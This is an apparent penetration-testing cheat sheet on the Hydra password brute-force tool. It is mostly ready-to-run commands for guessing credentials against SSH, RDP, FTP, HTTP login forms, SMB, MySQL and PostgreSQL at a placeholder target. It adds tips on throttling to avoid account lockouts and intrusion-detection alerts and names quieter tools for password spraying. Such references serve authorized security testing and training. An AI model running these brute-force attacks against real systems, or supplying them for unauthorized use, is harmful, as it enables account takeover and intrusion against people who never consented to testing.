# 10.02 Hydra

> Online password brute-force across 50+ protocols — SSH, RDP, SMB, MySQL, HTTP forms.

## Overview

Hydra is online brute-force — tries credentials against a live service. Supports SSH, RDP, MySQL, MSSQL, PostgreSQL, SMB, FTP, HTTP-form, HTTP-Basic, IMAP, POP3, SMTP, LDAP, more. Be aware: live brute = account lockouts, IDS alerts, slow. For password spraying, prefer kerbrute (Kerberos) or NetExec — they're quieter.

## Steps

- **Step 1** - Install (preinstalled on Kali).
- **Step 2** - Determine protocol + auth method.
- **Step 3** - Choose user + password lists.
- **Step 4** - Throttle with `-t` (threads) and `-W` (wait). Always.

## Commands

### Install

```bash
sudo apt install -y hydra
```

### SSH brute

```bash
hydra -L users.txt -P passwords.txt -t 4 -f ssh://<TARGET>
```

### RDP brute

```bash
hydra -L users.txt -P passwords.txt -t 4 rdp://<TARGET>
```

### FTP brute

```bash
hydra -L users.txt -P passwords.txt -t 4 ftp://<TARGET>
```

### HTTP POST form

```bash
# Find failure string from a failed login response (e.g. 'Invalid credentials')
hydra -L users.txt -P passwords.txt <TARGET> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid credentials'
```

### SMB brute

```bash
hydra -L users.txt -P passwords.txt -t 1 -W 3 smb://<TARGET>
# Lower threads and add wait to avoid lockouts
```

### MySQL/PostgreSQL

```bash
hydra -L users.txt -P passwords.txt mysql://<TARGET>
hydra -L users.txt -P passwords.txt postgres://<TARGET>
```

### Single user, many passwords (less lockout-prone)

```bash
hydra -l <USER> -P rockyou.txt -t 2 -W 5 ssh://<TARGET>
```
